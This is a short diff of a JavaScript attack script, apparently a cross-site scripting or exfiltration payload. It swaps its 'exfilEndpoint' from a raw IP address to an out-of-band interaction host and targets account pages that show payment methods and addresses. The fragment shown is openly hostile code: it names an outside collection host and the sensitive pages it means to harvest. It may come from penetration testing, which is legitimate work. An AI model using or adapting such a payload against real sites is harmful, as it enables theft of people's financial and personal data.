@@ -1,5 +1,5 @@
 (async () => {
-  const exfilEndpoint = "http://207.180.213.122:8080/";
+  const exfilEndpoint = "http://d0li5rpon5bt0r3fmp6gukygsu7n3fej6.oast.fun/";
   const targets = [
     "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
     "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
